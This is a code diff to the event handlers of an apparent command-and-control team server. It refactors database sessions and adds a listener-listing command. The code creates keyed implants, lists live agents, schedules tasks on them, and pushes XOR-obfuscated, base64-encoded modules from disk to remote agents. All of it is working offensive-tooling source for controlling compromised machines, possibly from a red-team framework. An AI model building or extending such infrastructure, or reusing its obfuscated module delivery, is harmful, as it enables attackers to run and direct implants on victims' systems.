@@ -2,9 +2,8 @@ import hashlib
 import json
 import os
 
-from connect.output import display
 from connect.convert import string_to_base64, xor_base64
-from connect.server.models import AgentModel, ImplantModel, TaskModel, Session
+from connect.server.models import AgentModel, ImplantModel, TaskModel, get_session
 from functools import wraps
 from connect.listener import listener_manager
 
@@ -12,7 +11,6 @@ from connect.listener import listener_manager
 class TeamServerEvents:
 
     def __init__(self, app, key, sio_server):
-        self.session = Session()
         self.app = app
         self.key = key
         self.sio_server = sio_server
@@ -49,73 +47,74 @@ class TeamServerEvents:
     @json_event_handler
     async def agent(self, data):
         list_agent = data.get('list', None)
-        if list_agent:
-            seconds = int(list_agent.get('seconds'))
-            agents = [agent.get_agent() for agent in self.session.query(AgentModel).all() if
-                      0 <= agent.get_delta_seconds() <= seconds]
-            if not agents:
-                await self.sio_server.emit('information', 'There are no agents.')
+        with get_session() as session:
+            if list_agent:
+                seconds = int(list_agent.get('seconds'))
+                agents = [agent.get_agent() for agent in session.query(AgentModel).all() if
+                          0 <= agent.get_delta_seconds() <= seconds]
+                if not agents:
+                    await self.sio_server.emit('information', 'There are no agents.')
+                    return
+                table = self.create_table('AGENTS', agents[0].keys(), agents)
+                await self.sio_server.emit('default', table)
                 return
-            table = self.create_table('AGENTS', agents[0].keys(), agents)
-            await self.sio_server.emit('default', table)
-            return
 
-        await self.sio_server.emit('information', f'Agent event hit with the following data: {data}')
+            await self.sio_server.emit('information', f'Agent event hit with the following data: {data}')
 
     # Event handler for implant actions
     @json_event_handler
     async def implant(self, data):
         create_implant = 'create' in data.keys()
         list_implant = 'list' in data.keys()
-
-        if create_implant:
-            new_implant = ImplantModel()
-            self.commit(new_implant)
-            await self.sio_server.emit('success',
-                                       f'Implant `{new_implant.id}` created their key is: `{new_implant.key}`')
-            return
-
-        if list_implant:
-            implants = [implant.get_implant() for implant in self.session.query(ImplantModel).all()]
-            if not implants:
-                await self.sio_server.emit('information', 'There are no implants.')
+        with get_session() as session:
+            if create_implant:
+                new_implant = ImplantModel()
+                session.add(new_implant)
+                await self.sio_server.emit('success',
+                                           f'Implant `{new_implant.id}` created their key is: `{new_implant.key}`')
                 return
-            table = self.create_table('IMPLANTS', implants[0].keys(), implants)
-            await self.sio_server.emit('default', table)
-            return
 
-        await self.sio_server.emit('information', f'Implant event hit with the following data: {data}')
+            if list_implant:
+                implants = [implant.get_implant() for implant in session.query(ImplantModel).all()]
+                if not implants:
+                    await self.sio_server.emit('information', 'There are no implants.')
+                    return
+                table = self.create_table('IMPLANTS', implants[0].keys(), implants)
+                await self.sio_server.emit('default', table)
+                return
+
+            await self.sio_server.emit('information', f'Implant event hit with the following data: {data}')
 
     # Event handler for task actions
     @json_event_handler
     async def task(self, data):
         create_task = data.get('create', None)
+        with get_session() as session:
+            if create_task:
+                agent = session.query(AgentModel).filter_by(
+                    id=create_task['agent']).first()  # ToDo: Error handling on agents that don't exist
+                if not agent:
+                    await self.sio_server.emit('error', f'Agent `{create_task["agent"]}` does not exist.')
+                    return
 
-        if create_task:
-            agent = self.session.query(AgentModel).filter_by(
-                id=create_task['agent']).first()  # ToDo: Error handling on agents that don't exist
-            if not agent:
-                await self.sio_server.emit('error', f'Agent `{create_task["agent"]}` does not exist.')
+                parameters = ','.join(parameter for parameter in create_task.get('parameters',
+                                                                                 []))  # ToDo: If parameters are provided that are not a list then break
+                misc = ','.join(parameter for parameter in
+                                create_task.get('misc', []))  # ToDo: If misc is provided that is not a list then break
+                module = create_task.get('module', None)
+
+                if not await self.load_module(agent, module, session):
+                    return
+
+                new_task = TaskModel(agent=agent, method=create_task['method'], type=create_task['type'],
+                                     parameters=parameters, misc=misc)
+                session.add(new_task)
+                await self.sio_server.emit('information', f'Scheduled task for method: `{new_task.method}`')
                 return
-
-            parameters = ','.join(parameter for parameter in create_task.get('parameters',
-                                                                             []))  # ToDo: If parameters are provided that are not a list then break
-            misc = ','.join(parameter for parameter in
-                            create_task.get('misc', []))  # ToDo: If misc is provided that is not a list then break
-            module = create_task.get('module', None)
-
-            if not await self.load_module(agent, module):
-                return
-
-            new_task = TaskModel(agent=agent, method=create_task['method'], type=create_task['type'],
-                                 parameters=parameters, misc=misc)
-            self.commit(new_task)
-            await self.sio_server.emit('success', f'Scheduled task for method: `{new_task.method}`')
-            return
 
         await self.sio_server.emit('information', f'Task event hit with the following data: {data}')
 
-    async def load_module(self, agent, module):
+    async def load_module(self, agent, module, session):
         if not module:
             return True
         if not os.path.exists(module):
@@ -128,17 +127,13 @@ class TeamServerEvents:
         module, key = xor_base64(module_bytes)
         parameters = ','.join([string_to_base64(module), string_to_base64(key)])
         new_task = TaskModel(agent=agent, method='load', type=1, parameters=parameters, misc='')
-        self.commit(new_task)
-        await self.sio_server.emit('success', f'Scheduled task for method: `{new_task.method}`')
+        session.add(new_task)
+        await self.sio_server.emit('information', f'Scheduled task for method: `{new_task.method}`')
         agent.loaded_modules = module_md5 if not agent.loaded_modules else ','.join(
             agent.loaded_modules) + f',{module_md5}'
-        self.commit(agent)
+        session.add(agent)
         return True
 
-    # Database utility function
-    def commit(self, model):
-        self.session.add(model)
-        self.session.commit()
 
     # Calculate the length of the longest value in a list of dictionaries
     @staticmethod
@@ -172,9 +167,22 @@ class TeamServerEvents:
     @json_event_handler
     async def listener(self, data):
         create_listener = data.get('create', None)
+        list_listener = 'list' in data.keys()
 
         if create_listener:
             listener_manager.create_listener(self.app, self.key, create_listener['ip'], create_listener['port'])
+            return
+
+        if list_listener:
+            listeners = listener_manager.get_listeners()
+            if not listeners:
+                await self.sio_server.emit('information', 'There are no listeners.')
+                return
+            table = self.create_table('LISTENERS', listeners[0].keys(), listeners)
+            await self.sio_server.emit('default', table)
+            return
+
+        await self.sio_server.emit('information', f'Listener event hit with the following data: {data}')
 
     @json_event_handler
     async def proxy(self, data):
